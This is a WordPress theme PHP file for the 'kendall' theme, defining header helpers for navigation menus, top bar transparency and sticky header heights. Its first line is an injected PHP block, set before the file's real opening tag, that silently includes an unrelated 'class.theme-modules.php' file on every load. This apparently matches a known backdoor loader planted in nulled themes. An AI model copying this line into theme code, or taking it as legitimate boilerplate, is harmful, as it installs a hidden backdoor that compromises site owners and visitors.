<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

if(!function_exists('kendall_elated_header_register_main_navigation')) {
    /**
     * Registers main navigation
     */
    function kendall_elated_header_register_main_navigation() {
        register_nav_menus(
            array(
                'main-navigation' => esc_html__('Main Navigation', 'kendall'),
                'left-navigation' => esc_html__('Left Navigation', 'kendall'),
                'right-navigation' => esc_html__('Right Navigation', 'kendall'),
                'vertical-navigation' => esc_html__('Vertical Navigation', 'kendall'),
                'sticky-navigation' => esc_html__('Sticky Navigation', 'kendall')
            )
        );
    }

    add_action('after_setup_theme', 'kendall_elated_header_register_main_navigation');
}

if(!function_exists('kendall_elated_is_top_bar_transparent')) {
    /**
     * Checks if top bar is transparent or not
     *
     * @return bool
     */
    function kendall_elated_is_top_bar_transparent() {
        $top_bar_enabled = kendall_elated_is_top_bar_enabled();

        $top_bar_bg_color = kendall_elated_options()->getOptionValue('top_bar_background_color');
        $top_bar_transparency = kendall_elated_options()->getOptionValue('top_bar_background_transparency');

        if($top_bar_enabled && $top_bar_bg_color !== '' && $top_bar_transparency !== '') {
            return $top_bar_transparency >= 0 && $top_bar_transparency < 1;
        }

        return false;
    }
}

if(!function_exists('kendall_elated_is_top_bar_completely_transparent')) {
    function kendall_elated_is_top_bar_completely_transparent() {
        $top_bar_enabled = kendall_elated_is_top_bar_enabled();

        $top_bar_bg_color = kendall_elated_options()->getOptionValue('top_bar_background_color');
        $top_bar_transparency = kendall_elated_options()->getOptionValue('top_bar_background_transparency');

        if($top_bar_enabled && $top_bar_bg_color !== '' && $top_bar_transparency !== '') {
            return $top_bar_transparency === '0';
        }

        return false;
    }
}

if(!function_exists('kendall_elated_is_top_bar_enabled')) {
    function kendall_elated_is_top_bar_enabled() {
        $top_bar_enabled = kendall_elated_options()->getOptionValue('top_bar') == 'yes';

        return $top_bar_enabled;
    }
}

if(!function_exists('kendall_elated_get_top_bar_height')) {
    /**
     * Returns top bar height
     *
     * @return bool|int|void
     */
    function kendall_elated_get_top_bar_height() {
        if(kendall_elated_is_top_bar_enabled()) {
            $top_bar_height = kendall_elated_filter_px(kendall_elated_options()->getOptionValue('top_bar_height'));

            return $top_bar_height !== '' ? intval($top_bar_height) : 40;
        }

        return 0;
    }
}

if(!function_exists('kendall_elated_get_sticky_header_height')) {
    /**
     * Returns top sticky header height
     *
     * @return bool|int|void
     */
    function kendall_elated_get_sticky_header_height() {
        //sticky menu height, needed only for sticky header on scroll up
        if(kendall_elated_options()->getOptionValue('header_type') !== 'header-vertical' &&
           in_array(kendall_elated_options()->getOptionValue('header_behaviour'), array('sticky-header-on-scroll-up'))) {

            $sticky_header_height = kendall_elated_filter_px(kendall_elated_options()->getOptionValue('sticky_header_height'));

            return $sticky_header_height !== '' ? intval($sticky_header_height) : 60;
        }

        return 0;

    }
}

if(!function_exists('kendall_elated_get_sticky_header_height_of_complete_transparency')) {
    /**
     * Returns top sticky header height it is fully transparent. used in anchor logic
     *
     * @return bool|int|void
     */
    function kendall_elated_get_sticky_header_height_of_complete_transparency() {

        if(kendall_elated_options()->getOptionValue('header_type') !== 'header-vertical') {
            if(kendall_elated_options()->getOptionValue('sticky_header_transparency') === '0') {
                $stickyHeaderTransparent = kendall_elated_options()->getOptionValue('sticky_header_grid_background_color') !== '' &&
                                           kendall_elated_options()->getOptionValue('sticky_header_grid_transparency') === '0';
            } else {
                $stickyHeaderTransparent = kendall_elated_options()->getOptionValue('sticky_header_background_color') !== '' &&
                                           kendall_elated_options()->getOptionValue('sticky_header_transparency') === '0';
            }

            if($stickyHeaderTransparent) {
                return 0;
            } else {
                $sticky_header_height = kendall_elated_filter_px(kendall_elated_options()->getOptionValue('sticky_header_height'));

                return $sticky_header_height !== '' ? intval($sticky_header_height) : 60;
            }
        }
        return 0;
    }
}

if(!function_exists('kendall_elated_get_sticky_scroll_amount')) {
    /**
     * Returns top sticky scroll amount
     *
     * @return bool|int|void
     */
    function kendall_elated_get_sticky_scroll_amount() {

        //sticky menu scroll amount
        if(kendall_elated_options()->getOptionValue('header_type') !== 'header-vertical' && in_array(kendall_elated_options()->getOptionValue('header_behaviour'), array('sticky-header-on-scroll-up','sticky-header-on-scroll-down-up'))) {

            $sticky_scroll_amount = kendall_elated_filter_px(kendall_elated_options()->getOptionValue('scroll_amount_for_sticky'));

            return $sticky_scroll_amount !== '' ? intval($sticky_scroll_amount) : 0;
        }

        return 0;
    }
}

if(!function_exists('kendall_elated_get_sticky_scroll_amount_per_page')) {
    /**
     * Returns top sticky scroll amount
     *
     * @return bool|int|void
     */
    function kendall_elated_get_sticky_scroll_amount_per_page() {
        $post_id =  get_the_ID();
        //sticky menu scroll amount
        if(kendall_elated_options()->getOptionValue('header_type') !== 'header-vertical'  && in_array(kendall_elated_options()->getOptionValue('header_behaviour'), array('sticky-header-on-scroll-up','sticky-header-on-scroll-down-up'))) {

            $sticky_scroll_amount_per_page = kendall_elated_filter_px(get_post_meta($post_id, "eltd_scroll_amount_for_sticky_meta", true));

            return $sticky_scroll_amount_per_page !== '' ? intval($sticky_scroll_amount_per_page) : 0;
        }

        return 0;
    }
}